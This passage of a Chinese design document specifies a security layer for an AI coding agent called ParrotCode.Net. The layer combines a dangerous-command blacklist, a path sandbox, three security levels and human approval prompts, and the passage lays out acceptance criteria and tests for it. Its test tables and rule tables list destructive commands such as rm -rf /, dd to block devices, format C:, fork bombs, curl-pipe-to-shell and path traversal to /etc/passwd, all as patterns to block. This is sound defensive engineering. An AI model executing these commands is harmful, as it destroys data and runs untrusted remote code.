    var securityLevel = ParseSecurityLevel(_config.Security?.Level);

    // 构造安全上下文（项目根 = 当前工作目录）
    var projectRoot = Directory.GetCurrentDirectory();
    var secCtx = new SecurityContext
    {
        ProjectRoot = projectRoot,
        AllowPaths = NormalizePaths(_config.Security?.AllowPaths, projectRoot),
        DenyPaths = NormalizePaths(_config.Security?.DenyPaths, projectRoot),
        ExtraBlacklist = _config.Security?.ExtraBlacklist ?? Array.Empty<string>()
    };
    var securityGuard = new SecurityGuard(secCtx, securityLevel, _logger);

    using var terminalApp = new TerminalApp(
        _provider, _providerConfig, _config.Agent, tuiConfig,
        securityLevel, securityGuard, _logger, _ct);
    await terminalApp.RunAsync();
}

/// <summary>规范化路径列表（相对→绝对，基于 projectRoot）。</summary>
private static IReadOnlyList<string> NormalizePaths(IList<string>? paths, string projectRoot)
{
    if (paths is null || paths.Count == 0) return Array.Empty<string>();
    var result = new List<string>(paths.Count);
    foreach (var p in paths)
    {
        try { result.Add(Path.GetFullPath(p, projectRoot)); }
        catch { /* 非法路径忽略 */ }
    }
    return result;
}
```

> **注**：`TerminalApp` 构造增加 `SecurityGuard` 参数。状态栏的 `securityLevel` 显示不变（仍传 `SecurityLevel`），迭代 8 后显示 `Permissive`（修正后拼写）。

### 4.11 拒绝信息回灌与 UI 展示

拦截走 `ToolResult.Fail` → `AgentLoop` emit `ToolResultEvent(Success=false, Error=reason)` → `ChatView` 渲染为 `⎿ ✗ [黑名单] 递归删除根目录（rm -rf /）`（红色）。

LLM 收到的 `tool_result` 消息 `content` 为拒绝原因，能看到 `[黑名单]` / `[路径沙箱]` 前缀，据此调整策略（如改用更安全的命令或路径）。

---

## 五、文件改动清单

### 5.1 新增文件（6 个）

```
Security/
├── SecurityLevel.cs              # 从 Tui/ 迁移，修正拼写 Permisive → Permissive
├── Models.cs                     # SecurityContext / PathCheckResult / BlacklistHit 等
├── Blacklist.cs                  # 危险命令黑名单
├── PathSandbox.cs                # 路径沙箱
├── SecurityPolicy.cs             # 三档模式策略评估（预留扩展点）
└── SecureBatchToolExecutor.cs    # BatchToolExecutor 子类
```

> `SecurityGuard.cs` 合并到 `Security/` 目录下（文件名 `Guard.cs` 或 `SecurityGuard.cs`，本设计取后者）。共 7 个新文件。

### 5.2 修改文件（5 个）

```
Agent/
└── BatchToolExecutor.cs          # ExecuteAsync 入口预扫描改造；Write 组去掉重复 OnBeforeExecuteAsync
Config/
└── Models.cs                     # SecurityConfig 扩展 AllowPaths/DenyPaths/ExtraBlacklist
Tui/
└── TerminalApp.cs                # StartAgentRound 注入 SecureBatchToolExecutor；构造加 SecurityGuard
App/
└── App.cs                        # 构造 SecurityContext + SecurityGuard 传入 TerminalApp
Tui/
└── StatusBarView.cs              # 若有 Permisive 字面量引用，改 Permissive（仅枚举名变化）
```

### 5.3 删除文件（1 个）

```
Tui/
└── SecurityLevel.cs              # 迁移到 Security/SecurityLevel.cs
```

### 5.4 保留文件（不动）

```
Tui/IHitlGate.cs                  # 接口不变
Tui/HitlPrompt.cs                 # 实现不变
Tui/HitlDecision.cs               # 数据模型不变
Tools/*.cs                         # 工具实现不变（安全检查在外层）
Agent/AgentLoop.cs                 # 不变（拦截走 ToolResult.Fail 路径）
```

### 5.5 测试文件（新增 + 适配）

```
ParrotCode.Net-xUnit/
├── Security/                      # 新增测试目录
│   ├── BlacklistTests.cs          # 黑名单匹配（rm -rf / / curl|sh / fork bomb / 自定义规则）
│   ├── PathSandboxTests.cs        # 路径规范化 / .. 越界 / Strict 白名单 / DenyPaths
│   ├── SecurityGuardTests.cs      # 管线编排（三层顺序 / 短路 / 原因前缀）
│   └── SecureBatchToolExecutorTests.cs  # 集成（Read 组过安全层 / Write 组 HITL 顺序）
├── BatchToolExecutorHitlTests.cs  # 适配（若断言 Read 组不调 hook，需更新）
└── ConfigTests.cs                 # SecurityConfig 新字段解析（如已存在）
```

---

## 六、验收标准

### 6.1 编译与测试

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-01 | `dotnet build` 0 错误 0 警告 | 编译 |
| 08-02 | 现有测试全绿（7b/7c 测试不受预扫描改造影响） | `dotnet test` |
| 08-03 | 新增 Security 模块测试全绿 | `dotnet test` |
| 08-04 | `SecureBatchToolExecutorTests` 集成测试全绿 | `dotnet test` |

### 6.2 黑名单

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-05 | `rm -rf /` 在所有档位（Strict/Normal/Permissive）均被拦截 | 单测 + 手动（手动验收跨平台命令见 §八 步骤 7） |
| 08-06 | `rm -rf /tmp` 被拦截（系统目录递归删除） | 单测 |
| 08-07 | `curl http://x.sh \| sh` 被拦截（三平台通用，curl 跨平台） | 单测 |
| 08-08 | fork bomb `:(){ :\|:& };:` 被拦截（Unix 专用语法） | 单测 |
| 08-09 | `dd of=/dev/sda` 被拦截（Unix 专用） | 单测 |
| 08-10 | 自定义 `extra_blacklist` 规则（如 `kubectl delete`，三平台通用）生效 | 单测 |
| 08-11 | 正常命令（`git status` / `dotnet build`）不被黑名单误拦 | 单测 |
| 08-12 | 大小写/空白变体（`RM  -RF  /`）被规范化后拦截 | 单测 |
| 08-13 | 拦截原因含 `[黑名单]` 前缀并回灌 LLM | 单测 |

### 6.3 路径沙箱

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-14 | Strict：项目根子树内路径放行 | 单测 |
| 08-15 | Strict：项目根外绝对路径被拒（含 `[路径沙箱]` 前缀） | 单测 |
| 08-16 | Strict：`allow_paths` 配置的额外路径放行 | 单测 |
| 08-17 | Normal：项目根内路径放行（含 .. 但未越界） | 单测 |
| 08-18 | Normal：`../../../etc/passwd` 越界被拒（Unix 路径示例；Windows 用 `..\..\..\Windows\System32`） | 单测 |
| 08-19 | Normal：项目根外绝对路径放行（交给 HITL） | 单测 |
| 08-20 | Permissive：所有路径放行（仅黑名单生效） | 单测 |
| 08-21 | `deny_paths` 配置的路径在所有非 Permissive 档位被拒 | 单测 |
| 08-22 | Windows 大小写不敏感：`D:\Proj\file` 与 `d:\proj\FILE` 视为同路径 | 单测 |
| 08-23 | 子树边界：`/home/user-evil` 不误判为 `/home/user` 子树 | 单测 |

### 6.4 三档模式与 HITL

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-24 | Normal：`read_file` 不弹 HITL 确认 | 手动 |
| 08-25 | Normal：`write_file` 弹 HITL 确认 | 手动 |
| 08-26 | Strict：白名单外 `write_file` 被沙箱拦（不弹 HITL） | 手动 |
| 08-27 | Strict：白名单内 `write_file` 弹 HITL 确认 | 手动 |
| 08-28 | Permissive：`write_file` 不弹 HITL（无安全层配置时） | 手动 |
| 08-29 | Permissive：黑名单仍拦（不依赖档位；Unix `rm -rf /` / Win `rd /s /q C:\` / 跨平台 `curl\|sh`） | 手动 |
| 08-30 | 安全层拒绝时不弹 HITL（避免打扰已拦截操作） | 手动 |

### 6.5 拒绝信息回灌

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-31 | 拦截后 AI 收到含原因的 `ToolResult.Error` | 手动：让 AI 执行黑名单命令（三平台通用 `curl x \| sh`，或 Unix `rm -rf /`，或 Win `rd /s /q C:\`），看 AI 回复"无法执行" |
| 08-32 | 拒绝原因含来源前缀（`[黑名单]`/`[路径沙箱]`/`[策略]`） | 单测 |
| 08-33 | ChatView 显示拦截结果（红色 `✗` + 原因） | 手动 |

### 6.6 配置与装配

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-34 | `.parrotcode.yaml` 的 `security.level: strict` 生效 | 手动 |
| 08-35 | `allow_paths` / `deny_paths` / `extra_blacklist` 解析正确 | 单测 |
| 08-36 | 旧拼法 `permisive` 仍可解析（向后兼容） | 单测 |
| 08-37 | 状态栏显示修正后的 `Permissive` | 手动 |
| 08-38 | 无 security 配置时默认 Normal，行为与 7c 一致 | 手动 |

### 6.7 Read 组安全层

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08-39 | Strict：`read_file` 越界路径被拦（Read 组也过安全层） | 单测 |
| 08-40 | Normal：`read_file` 项目根内放行（不弹 HITL） | 单测 + 手动 |
| 08-41 | 黑名单对 Read 组工具不生效（read_file 无命令参数） | 单测 |

---

## 七、测试计划

### 7.1 单元测试（新增）

| 测试文件 | 覆盖范围 | 用例数 |
|---------|---------|--------|
| `BlacklistTests.cs` | 硬编码规则匹配、自定义规则、规范化、误拦防护 | 12 |
| `PathSandboxTests.cs` | 规范化、.. 越界、Strict 白名单、DenyPaths、跨平台大小写、子树边界 | 14 |
| `SecurityGuardTests.cs` | 三层顺序、短路、原因前缀、非命令工具放行、Level 切换 | 10 |
| `SecureBatchToolExecutorTests.cs` | Read 组过安全层、Write 组 HITL 顺序、拦截不进分组、全放行分组执行 | 8 |

### 7.2 适配的现有测试

| 测试文件 | 改动 |
|---------|------|
| `BatchToolExecutorHitlTests.cs` | 若有断言"Read 组不调 OnBeforeExecuteAsync"，更新为"Read 组也调但默认放行" |
| `HitlPromptTests.cs` | 不变（IHitlGate 接口未变） |
| `AgentLoopHitlTests.cs` | 不变（AgentLoop 未改） |

### 7.3 测试策略

- **纯逻辑单测**：`Blacklist` / `PathSandbox` / `SecurityGuard` 无 IO 依赖，直接 new + 断言。
- **集成测试**：`SecureBatchToolExecutorTests` 用假 `ToolRegistry` + 假 `ToolExecutor`，验证预扫描 → 分组 → HITL 顺序。
- **跨平台**：路径测试用 `Path.Combine` 构造，避免硬编码分隔符；大小写测试用 `OSPlatform` 标记跳过或条件断言。

---

## 八、实施步骤

### 步骤 1：迁移 SecurityLevel + 修正拼写

- 新建 `Security/SecurityLevel.cs`，枚举值改 `Permissive`
- 删除 `Tui/SecurityLevel.cs`
- `App.ParseSecurityLevel` 兼容旧拼法 `permisive`
- `StatusBarView` 等引用更新（枚举名变化）
- 验证：`dotnet build` 通过，现有测试全绿

### 步骤 2：实现 Blacklist + PathSandbox + 单测

- 新建 `Security/Models.cs`（SecurityContext / PathCheckResult / BlacklistHit）
- 新建 `Security/Blacklist.cs` + 单测
- 新建 `Security/PathSandbox.cs` + 单测
- 验证：黑名单/沙箱单测全绿

### 步骤 3：实现 SecurityPolicy + SecurityGuard + 单测

- 新建 `Security/SecurityPolicy.cs`（默认放行，预留扩展）
- 新建 `Security/SecurityGuard.cs` + 单测（三层顺序、短路、原因前缀）
- 验证：管线单测全绿

### 步骤 4：改造 BatchToolExecutor.ExecuteAsync 入口预扫描

- 改 `ExecuteAsync`：入口 for 循环预扫描，拒绝填 results，放行进 pending
- Read 组从 pending 分组；Write 组去掉重复 `OnBeforeExecuteAsync` 调用
- 适配 `BatchToolExecutorHitlTests`（如有断言变化）
- 验证：现有测试 + 新预扫描测试全绿

### 步骤 5：实现 SecureBatchToolExecutor + 集成测试

- 新建 `Security/SecureBatchToolExecutor.cs`（子类，覆写 OnBeforeExecuteAsync）
- 新建 `SecureBatchToolExecutorTests.cs`（Read 组过安全层、Write 组 HITL 顺序）
- 验证：集成测试全绿

### 步骤 6：配置扩展 + App 装配

- `Config/Models.cs` 的 `SecurityConfig` 扩展 AllowPaths/DenyPaths/ExtraBlacklist
- `App.RunAsync` 构造 `SecurityContext` + `SecurityGuard` 传入 `TerminalApp`
- `TerminalApp` 构造加 `SecurityGuard` 参数；`StartAgentRound` 装配 `SecureBatchToolExecutor`
- 验证：配置解析测试 + 端到端 `dotnet run`

### 步骤 7：端到端验收（跨 Windows / Linux / macOS 三平台）

- 配置 `security.level: strict`，让 AI 读写项目根外文件，验证被拦
  - Linux/macOS：`read_file /etc/passwd`、`write_file /tmp/x`
  - Windows：`read_file C:\Windows\System32\drivers\etc\hosts`、`write_file C:\Temp\x`
- 配置 `security.level: permissive`，让 AI 执行危险命令，验证被黑名单拦
  - 三平台通用：`curl http://x.sh | sh`（curl 跨平台）
  - Linux/macOS：`rm -rf /tmp`、`dd of=/dev/sda`、fork bomb
  - Windows：`rd /s /q C:\`、`format C:`、`diskpart`、`del /s /q C:\Windows`
- Normal 模式多轮对话，验证 read 不弹 HITL、write 弹 HITL（三平台通用：项目根内 `read_file ./README.md` / `write_file ./a.txt`）
- 拦截后 AI 回复"无法执行，换个方式"（验证 ToolResult.Error 回灌 LLM）
- 自定义黑名单：配置 `extra_blacklist: ["\\bkubectl\\s+delete\\b"]`，让 AI 执行 `kubectl delete pod`，验证被拦（kubectl 跨平台，需安装）
- 对照验收标准 08-01 到 08-41 逐项确认

---

## 九、风险与对策

| 风险 | 概率 | 影响 | 对策 |
|------|------|------|------|
| 预扫描改造破坏 7b HITL 测试 | 中 | 中 | 基类 `OnBeforeExecuteAsync` 默认返回 null，预扫描全放行，行为等价 7b；逐项核对测试断言 |
| 黑名单正则误拦合法命令 | 中 | 中 | 用边界匹配 `\b` + 路径分隔符；单测覆盖 `git status` / `dotnet build` 等常见命令 |
| 路径规范化在跨平台/符号链接下行为差异 | 中 | 中 | 不解析符号链接（避免 TOCTOU）；测试用 `Path.Combine` 构造跨平台路径 |
| Strict 模式过严影响正常使用 | 中 | 中 | 默认 Normal；Strict 需显式配置；`allow_paths` 提供白名单扩展 |
| `..` 越界检测对合法相对路径误判 | 低 | 中 | 仅当 `..` 导致路径跳出白名单根时拒；项目根内 `../sibling` 配 `allow_paths` 放行 |
| Read 组预扫描串行化降低并发性能 | 低 | 低 | 预扫描是纯内存字符串操作，微秒级；实际工具执行的并发不受影响 |

---

## 十、与后续迭代的衔接

### 10.1 迭代 9（上下文管理）

- 安全层与上下文压缩无耦合；`Truncator`/`Summarizer` 在 `SecurityGuard` 之后，不影响拦截逻辑。

### 10.2 迭代 10（斜杠命令 + 持久化）

- `/mode strict|normal|permissive` 命令运行时切换 `SecurityGuard.Level`（已预留可变属性）。
- `AllowPermanent` 决策持久化到 JSONL，跨会话加载。
- 项目指令 `PARROTCODE.md` 可声明默认安全等级。

### 10.3 迭代 11（MCP）

- MCP 工具调用同样过 `SecurityGuard`（`run_command` 类 MCP 工具受黑名单约束）。
- MCP 工具名前缀 `{server_name}/{tool_name}`，`Blacklist` 按工具名 `run_command` 匹配，MCP 的命令工具需适配 `ExtractCommand`（如 MCP server 暴露同名 `run_command`）。

### 10.4 迭代 12（Hook + 子 Agent）

- Hook 的 `tool_pre_exec` 在 `SecurityGuard` 之后执行（Hook 是更细粒度的用户自定义拦截）。
- `SecurityPolicy.Evaluate` 可作为 Hook 的内置规则来源（进阶练习：YAML 规则文件）。
- 子 Agent 的工具调用同样过 `SecurityGuard`（全局安全不变量）。

---

## 附录 A：三档模式行为矩阵

| 档位 \ 检查 | 黑名单 | 路径沙箱 | Write HITL |
|-------------|--------|---------|------------|
| Strict | ✅ 拦截 | ✅ 白名单子树内放行，外拒 | ✅ 白名单内仍询问 |
| Normal | ✅ 拦截 | ✅ .. 越界拒，绝对路径外放行 | ✅ 询问 |
| Permissive | ✅ 拦截 | ❌ 不查 | ❌ 不询问（无安全配置时） |

> 黑名单始终生效（防 Permissive 下 `rm -rf /`）。

## 附录 B：黑名单规则速查

| 规则 | 正则（简写） | 拦截原因 |
|------|-------------|---------|
| 递归删除根 | `rm -[rRf]* /` | 递归删除根目录 |
| 递归删系统目录 | `rm -[rRf]* /(boot\|etc\|usr\|...)` | 递归删除系统目录 |
| 远程脚本执行 | `curl\|wget ... \| sh` | 远程脚本执行 |
| 下载写块设备 | `curl/wget > /dev/sd*` | 下载写入块设备 |
| fork bomb | `:(){ :\|:& };:` | fork bomb |
| 写块设备 | `dd of=/dev/sd*` | 写块设备 |
| 格式化 | `mkfs /dev/` | 格式化块设备 |
| **— Windows —** | | |
| 递归删盘符根 | `rd /s ... C:\` | 递归删除盘符根 |
| 递归删系统目录 | `rd /s ... C:\Windows / C:\Users` | 递归删除 Windows 系统目录 |
| 删盘符根文件 | `del /s ... C:\*` | 递归删除盘符根文件 |
| 格式化磁盘 | `format C:` | 格式化磁盘 |
| 磁盘分区 | `diskpart` | 磁盘分区工具 |
| PowerShell 远程执行 | `irm\|iwr\|curl \| iex\|powershell` | 远程脚本执行 |
| cmd fork bomb | `%0\|%0` | fork bomb |

> **跨平台策略**：Unix + Windows 规则全部加载（不匹配的无害）。`run_command` 在 Windows 用 `cmd /c`、Unix 用 `sh -c`，黑名单必须覆盖两个平台。完整规则见 [iter-08a-design.md](iter-08a-design.md) §3.3。

## 附录 C：拒绝原因格式

所有拦截原因统一前缀，便于 LLM 和用户识别：

- `[黑名单] {规则原因}` — 如 `[黑名单] 递归删除根目录（rm -rf /）`
- `[路径沙箱] {Detail}` — 如 `[路径沙箱] .. 遍历跳出项目根：../../etc/passwd → /etc/passwd`
- `[策略] {Detail}` — 策略层拦截（本迭代默认不触发）

回灌给 LLM 的 `ToolResult.Error` 即上述字符串，LLM 据前缀判断拦截来源并调整。

---

**文档结束**。状态：[设计完成，待实现]
